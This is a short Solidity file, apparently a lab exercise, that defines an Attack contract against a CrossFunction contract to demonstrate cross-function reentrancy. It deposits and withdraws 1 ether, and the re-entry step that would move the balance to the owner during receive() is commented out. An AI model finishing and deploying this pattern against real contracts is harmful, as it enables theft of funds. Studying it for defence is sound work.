// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;
import {CrossFunction} from "./CrossFunction.sol";

contract Attack {
    CrossFunction crossFunction;

    uint256 public constant AMOUNT = 1 ether;
    address owner;

    constructor(CrossFunction _crossFunction, address _owner) {
        crossFunction = _crossFunction;
        owner = _owner;
    }

    function deposit() payable external {
        require(msg.value >= AMOUNT, "MAKE ENOUGH DePOSIT");
        crossFunction.deposit{value: AMOUNT}();
    }

    function withdraw() external {
        crossFunction.withdraw(AMOUNT);
    }

    receive() payable external {
    //     uint256 crossFunctionBalance = crossFunction.getBalance(address(this));
    //     crossFunction.transfer(owner, crossFunctionBalance);
     }
}